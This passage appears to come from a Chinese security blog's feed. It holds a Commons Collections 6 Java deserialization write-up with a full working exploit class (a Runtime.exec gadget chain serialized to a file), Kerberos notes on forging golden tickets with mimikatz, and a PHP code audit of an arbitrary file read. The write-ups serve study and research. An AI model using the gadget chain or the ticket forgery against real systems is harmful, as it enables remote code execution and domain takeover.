<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串<br>在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_bZ79KQAduY.png"></p>
<p>它的代码也⽐较简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>();</span><br><span class="line">   iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">   object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line">   <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="理解demo"><a href="#理解demo" class="headerlink" title="理解demo"></a>理解demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我创建了⼀个<code>ChainedTransformer</code>，其中包含两个<code>Transformer</code>：第⼀个是<code>ConstantTransformer</code>，<br>直接返回当前环境的Runtime对象；第⼆个是<code>InvokerTransformer</code>，执⾏Runtime对象的exec⽅法，参<br>数是 <code>/System/Applications/Calculator.app/Contents/MacOS/Calculator </code>。</p>
<p>当然，这个<code>transformerChain</code>只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的<br><code>TransformedMap.decorate</code> ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>

<p>触发回调就是向Map中放⼊⼀个新的元素：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Commons-Collections6"><a href="#Commons-Collections6" class="headerlink" title="Commons Collections6"></a>Commons Collections6</h1><p>理解了TransformedMap之后可以知道CC链利用前提是序列化和反序列化。</p>
<ul>
<li><p>序列化需要2个条件：</p>
<ol>
<li><p>该类必须实现<code>java.io.Serlalizable</code>接口</p>
</li>
<li><p>该类的所有属性必须是可序列化的，如果⼀个属性是不可序列化的，则属性必须标明是短暂的。</p>
<p>比如：<a href="https://so.csdn.net/so/search?q=static&spm=1001.2101.3001.7020" title="static">static</a>，transient 修饰的变量不可被序列化</p>
</li>
</ol>
</li>
</ul>
<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>不能new 一个Runtime类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Runtime runtime;</span><br><span class="line">        runtime = <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Runtime是一个单例类，单例类是不能够进行new的。</strong></p>
<h2 id="CC链利用的类"><a href="#CC链利用的类" class="headerlink" title="CC链利用的类"></a>CC链利用的类</h2><p>CC链的原理就是利用反射获取类，放到readObject方法中，向TransformedMap中放入一个新元素触发回调。</p>
<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HaspMap.readObject.hash()</span><br><span class="line">  --&gt;TiedMapEntry.hashCode()</span><br><span class="line">    --&gt;TiedMapEntry.getValue()</span><br><span class="line">      --&gt;LazyMap.get()</span><br><span class="line">        --&gt;ChainedTransformer.transformer()</span><br><span class="line">          --&gt;InvokerTransformer.transformer()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我这里分析用的是LazyMap方法，是因为ysoserial用的也是LazyMap方法，但是实际上还有2个可以用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_mYLoJ0Cbf8.png"></p>
<p>也就是一共3个方法可用。</p>
<ul>
<li><p>在回到LazyMap， 思路是看谁调用了get</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_ZKsMnjE3px.png"></p>
</li>
</ul>
<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>在TiedMapEntry类中可以看到hashCode()方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_3KpnS7FQxN.png"></p>
<p>方法中调用了getValue()跟进</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_EewtjgEqeB.png"></p>
<p>链子：<code>TiedMapEntry.hashCode--&gt;TiedMapEntry.getValue--&gt;get</code></p>
<p>所以可以把map.get改为LazyMap.get。</p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap.readObject中调用了hash方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QXZW0qXMpR.png"></p>
<p>跟进hash方法，会调用hashCode方法，这个就和上面的接上了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_GSsywnWxz0.png"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>((Filename)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">//TiedMapEntry.getValue()中调用了get方法</span></span><br><span class="line">        <span class="comment">//TiedMapEntry.hashCode--&gt;getValue--&gt;get</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">//tiedMapEntry.getValue();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//将lazymap对象的factory变量赋值</span></span><br><span class="line">        factoryfield.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个过程中会用到put，但是put就会触发hash，但是我们不想在这里执行弹计算器；所以先在第40行LazyMap.decorate中整一无关的类对象，然后在第52-56行进行反射重新给lazyMap赋值，这样put的时候就不会弹计算器，但是序列化的过程是正确的。</p>
<ul>
<li><p>但是执行会出现这个错误</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_81zOzG4QUI.png"></p>
</li>
</ul>
<p>这个是因为在3.2.2版本中，禁用了序列化时调用<code>org.apache.commons.collections.functors.InvokerTransformer</code> ，改为false即可。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Js4bSTo9m1.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC6</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberos详解</title>
    <url>/windows/Kerberos/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又水一篇文，不愧是我🤣</p>
<span id="more"></span>

<h1 id="kerberos-协议概述"><a href="#kerberos-协议概述" class="headerlink" title="kerberos 协议概述"></a>kerberos 协议概述</h1><p><code>Kerberos</code>是一种由MIT（麻省理工大学）提出的一种<strong>网络身份验证协议</strong>。它旨在通过使用密钥加密技术为<code>客户端</code>&#x2F;<code>服务器应用程序</code>提供<strong>强身份验证</strong>。</p>
<p>在<code>Kerberos</code>协议中主要是有三个角色的存在：</p>
<ol>
<li><p>访问服务的<code>Client</code>(以下表述为Client 或者用户)</p>
</li>
<li><p>提供服务的<code>Server</code>(以下表述为服务)</p>
</li>
<li><p><code>KDC</code>（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</p>
</li>
</ol>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在<code>Kerberos</code>中<code>Client</code>是否有权限访问<code>Server</code>端的服务由<code>KDC</code>发放的票据来决定。</p>
<p>kerberos的简化认证认证过程如下图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_vEQeoGFNDQ.png"></p>
<ol>
<li><p><code>AS_REQ</code>: Client向KDC发起AS_REQ,请求凭据是<strong>Client hash加密的时间戳</strong></p>
</li>
<li><p><code>AS_REP</code>: KDC使用Client hash进行解密，如果结果正确就返回用<strong>krbtgt hash加密的TGT票据</strong>，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</p>
</li>
<li><p><code>TGS_REQ</code>: Client<strong>凭借TGT票据向KDC发起针对特定服务的</strong><code>TGS_REQ</code><strong>请求</strong></p>
</li>
<li><p><code>TGS_REP</code>: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</p>
</li>
<li><p><code>AP_REQ</code>: Client拿着TGS票据去请求服务</p>
</li>
<li><p><code>AP_REP</code>: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</p>
</li>
</ol>
<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h1><h2 id="pvno"><a href="#pvno" class="headerlink" title="pvno"></a>pvno</h2><p>kerberos 版本号</p>
<h2 id="msg-type"><a href="#msg-type" class="headerlink" title="msg-type"></a>msg-type</h2><p>类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)</p>
<h2 id="PA-DATA"><a href="#PA-DATA" class="headerlink" title="PA_DATA"></a>PA_DATA</h2><p>主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。</p>
<p>type主要有以下一些</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            NONE = <span class="number">0</span>,</span><br><span class="line">​            TGS_REQ = <span class="number">1</span>,</span><br><span class="line">​            AP_REQ = <span class="number">1</span>,</span><br><span class="line">​            ENC_TIMESTAMP = <span class="number">2</span>,</span><br><span class="line">​            PW_SALT = <span class="number">3</span>,</span><br><span class="line">​            ENC_UNIX_TIME = <span class="number">5</span>,</span><br><span class="line">​            SANDIA_SECUREID = <span class="number">6</span>,</span><br><span class="line">​            SESAME = <span class="number">7</span>,</span><br><span class="line">​            OSF_DCE = <span class="number">8</span>,</span><br><span class="line">​            CYBERSAFE_SECUREID = <span class="number">9</span>,</span><br><span class="line">​            AFS3_SALT = <span class="number">10</span>,</span><br><span class="line">​            ETYPE_INFO = <span class="number">11</span>,</span><br><span class="line">​            SAM_CHALLENGE = <span class="number">12</span>,</span><br><span class="line">​            SAM_RESPONSE = <span class="number">13</span>,</span><br><span class="line">​            PK_AS_REQ_19 = <span class="number">14</span>,</span><br><span class="line">​            PK_AS_REP_19 = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ_WIN = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ = <span class="number">16</span>,</span><br><span class="line">​            PK_AS_REP = <span class="number">17</span>,</span><br><span class="line">​            PA_PK_OCSP_RESPONSE = <span class="number">18</span>,</span><br><span class="line">​            ETYPE_INFO2 = <span class="number">19</span>,</span><br><span class="line">​            USE_SPECIFIED_KVNO = <span class="number">20</span>,</span><br><span class="line">​            SVR_REFERRAL_INFO = <span class="number">20</span>,</span><br><span class="line">​            SAM_REDIRECT = <span class="number">21</span>,</span><br><span class="line">​            GET_FROM_TYPED_DATA = <span class="number">22</span>,</span><br><span class="line">​            SAM_ETYPE_INFO = <span class="number">23</span>,</span><br><span class="line">​            SERVER_REFERRAL = <span class="number">25</span>,</span><br><span class="line">​            TD_KRB_PRINCIPAL = <span class="number">102</span>,</span><br><span class="line">​            PK_TD_TRUSTED_CERTIFIERS = <span class="number">104</span>,</span><br><span class="line">​            PK_TD_CERTIFICATE_INDEX = <span class="number">105</span>,</span><br><span class="line">​            TD_APP_DEFINED_ERROR = <span class="number">106</span>,</span><br><span class="line">​            TD_REQ_NONCE = <span class="number">107</span>,</span><br><span class="line">​            TD_REQ_SEQ = <span class="number">108</span>,</span><br><span class="line">​            PA_PAC_REQUEST = <span class="number">128</span>,</span><br><span class="line">​            S4U2SELF = <span class="number">129</span>,</span><br><span class="line">​            PA_PAC_OPTIONS = <span class="number">167</span>,</span><br><span class="line">​            PK_AS_09_BINDING = <span class="number">132</span>,</span><br><span class="line">​            CLIENT_CANONICALIZED = <span class="number">133</span></span><br></pre></td></tr></table></figure>

<p>在AS_REQ阶段主要用到的有两个</p>
<ul>
<li><p><code>ENC_TIMESTAMP</code></p>
<p>这个是<strong>预认证</strong>，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过</p>
</li>
<li><p><code>PA_PAC_REQUEST</code></p>
<p>这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。详细的内容之后将有一篇文章详细介绍PAC。PAC包含在AS_REQ的响应body(AS_REP)。这里的value对应的是include&#x3D;true或者include&#x3D;false(KDC根据include的值来判断返回的票据中是否携带PAC)。</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_ovs2R1tk4p.png"></p>
<h2 id="REQ-BODY"><a href="#REQ-BODY" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h2><ul>
<li>kdc-options 一些flag 字段</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  VALIDATE = <span class="number">0x00000001</span>,</span><br><span class="line">​              RENEW = <span class="number">0x00000002</span>,</span><br><span class="line">​              UNUSED29 = <span class="number">0x00000004</span>,</span><br><span class="line">​              ENCTKTINSKEY = <span class="number">0x00000008</span>,</span><br><span class="line">​              RENEWABLEOK = <span class="number">0x00000010</span>,</span><br><span class="line">​              DISABLETRANSITEDCHECK = <span class="number">0x00000020</span>,</span><br><span class="line">​              UNUSED16 = <span class="number">0x0000FFC0</span>,</span><br><span class="line">​              CANONICALIZE = <span class="number">0x00010000</span>,</span><br><span class="line">​              CNAMEINADDLTKT = <span class="number">0x00020000</span>,</span><br><span class="line">​              OK_AS_DELEGATE = <span class="number">0x00040000</span>,</span><br><span class="line">​              UNUSED12 = <span class="number">0x00080000</span>,</span><br><span class="line">​              OPTHARDWAREAUTH = <span class="number">0x00100000</span>,</span><br><span class="line">​              PREAUTHENT = <span class="number">0x00200000</span>,</span><br><span class="line">​              INITIAL = <span class="number">0x00400000</span>,</span><br><span class="line">​              RENEWABLE = <span class="number">0x00800000</span>,</span><br><span class="line">​              UNUSED7 = <span class="number">0x01000000</span>,</span><br><span class="line">​              POSTDATED = <span class="number">0x02000000</span>,</span><br><span class="line">​              ALLOWPOSTDATE = <span class="number">0x04000000</span>,</span><br><span class="line">​              PROXY = <span class="number">0x08000000</span>,</span><br><span class="line">​              PROXIABLE = <span class="number">0x10000000</span>,</span><br><span class="line">​              FORWARDED = <span class="number">0x20000000</span>,</span><br><span class="line">​              FORWARDABLE = <span class="number">0x40000000</span>,</span><br><span class="line">​              RESERVED = <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>cname</p>
<p>PrincipalName 类型。PrincipalName包含type和value。</p>
<ul>
<li><p>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal 如dailker</p>
</li>
<li><p>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) 如krbtgt，cifs</p>
</li>
<li><p>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:user@domain.com" title="user@domain.com">user@domain.com</a></p>
</li>
</ul>
<p>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href="/windows-protocol/kerberos/1#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98" title="相关的安全问题&gt;用户名枚举">相关的安全问题&gt;用户名枚举</a></p>
</li>
<li><p>sname</p>
<p>PrincipalName 类型</p>
<p>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>
</li>
<li><p>realm</p>
<p>域名</p>
</li>
<li><p>from</p>
<p>发送时间</p>
</li>
<li><p>till</p>
<p>到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为<code>特征</code>来检测工具。</p>
</li>
<li><p>nonce</p>
<p>随机生成的一个数kekeo&#x2F;mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为<code>特征</code>检测工具。</p>
</li>
<li><p>etype</p>
<p>加密类型，有</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">             des_cbc_crc = <span class="number">1</span>,</span><br><span class="line">​             des_cbc_md4 = <span class="number">2</span>,</span><br><span class="line">​             des_cbc_md5 = <span class="number">3</span>,</span><br><span class="line">​             des3_cbc_md5 = <span class="number">5</span>,</span><br><span class="line">​             des3_cbc_sha1 = <span class="number">7</span>,</span><br><span class="line">​             dsaWithSHA1_CmsOID = <span class="number">9</span>,</span><br><span class="line">​             md5WithRSAEncryption_CmsOID = <span class="number">10</span>,</span><br><span class="line">​             sha1WithRSAEncryption_CmsOID = <span class="number">11</span>,</span><br><span class="line">​             rc2CBC_EnvOID = <span class="number">12</span>,</span><br><span class="line">​             rsaEncryption_EnvOID = <span class="number">13</span>,</span><br><span class="line">​             rsaES_OAEP_ENV_OID = <span class="number">14</span>,</span><br><span class="line">​             des_ede3_cbc_Env_OID = <span class="number">15</span>,</span><br><span class="line">​             des3_cbc_sha1_kd = <span class="number">16</span>,</span><br><span class="line">​             aes128_cts_hmac_sha1 = <span class="number">17</span>,</span><br><span class="line">​             aes256_cts_hmac_sha1 = <span class="number">18</span>,</span><br><span class="line">​             rc4_hmac = <span class="number">23</span>,</span><br><span class="line">​             rc4_hmac_exp = <span class="number">24</span>,</span><br><span class="line">​             subkey_keymaterial = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<p>这个地方要注意的是如果在配置里面选择用hash(不是plaintext)的话，hash的加密类型，要跟etype一样。因为KDC是按照etype类型选择用户对应加密方式的hash，如果是选择明文(plaintext)，那么client 会按照etype里面的加密方式将明文加密成hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gDOZ_LL2q7.png"></p>
<h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><p>在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。</p>
<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kerberos::golden</span><br></pre></td></tr></table></figure>

<p><code>mimikatz</code>的<code>kerberos::golden</code>模块可以用于制作黄金票据,票据格式是<code>.kirbi</code></p>
<p>首先获取krbtgt的hash</p>
<p><img src="https://p0.ssl.qhimg.com/t0103e479df6f95c9ab.png"></p>
<p>获取域的sid</p>
<p><img src="https://p5.ssl.qhimg.com/t017ed9b1c7d455c5d2.png"></p>
<p>制作黄金票据</p>
<p><img src="https://p5.ssl.qhimg.com/t01ae3c1d04ccc46dfc.png"></p>
]]></content>
      <categories>
        <category>windows认证机制</category>
      </categories>
      <tags>
        <tag>Kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>记某次代码审计</title>
    <url>/read/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某个博客框架的最新版</p>
<span id="more"></span>

<h1 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1><ul>
<li>于 <code>include.lib.function.base.php</code> 处发现一个<code>file_get_contents</code> 函数：</li>
</ul>
<p>   <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Q4KCHYHMR9.png"></p>
<ul>
<li><p>回调<code>imageCropAndResize</code> 方法看<code>src_image</code> 参数是否可控</p>
<p>又于该文件夹中发现<code>resizeImage</code> 方法调用了<code>imageCropAndResize</code> 方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage__utB-_B7hI.png"></p>
</li>
<li><p>回调</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_AZePoqLEO8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Q1D3dnAZpY.png"></p>
<p>由上图可见tmpFile可控</p>
</li>
<li><p>回调，得到过滤规则</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_lV8PsVFEq5.png"></p>
</li>
<li><p>回调</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_M2IXbbl6Iv.png"></p>
<p>头像上传处的功能点的tmpFile参数</p>
</li>
<li><p>回调，即可发现最开始调用的位置。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_NK059U6L02.png"></p>
</li>
</ul>
<h1 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h1><p>由以上分析可得调用链为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">admin.blogger.php</span><br><span class="line">  --&gt;uploadCropImg</span><br><span class="line">      --&gt;upload2local</span><br><span class="line">          --&gt;upload</span><br><span class="line">              --&gt;resizeImage</span><br><span class="line">                  --&gt;imageCropAndResize</span><br><span class="line">                      --&gt;include.lib.[function.base.php]</span><br></pre></td></tr></table></figure>


<ul>
<li><p>调试可知<code>tmpFile</code>参数为临时文件名</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_i6HyBtdKL5.png"></p>
<p>可以通过POST的方式上传文件，对<code>$_FILES</code>数组产生影响，进而影响tmp_name，导致任意文件读取。</p>
</li>
</ul>
<p>验证</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QdZKgnQGsQ.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代审</tag>
      </tags>
  </entry>
  <entry>
    <title>BCEL FastJson攻击链分析</title>
    <url>/JAVA%E5%AE%89%E5%85%A8/BCEL%20FastJson%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90/</url>
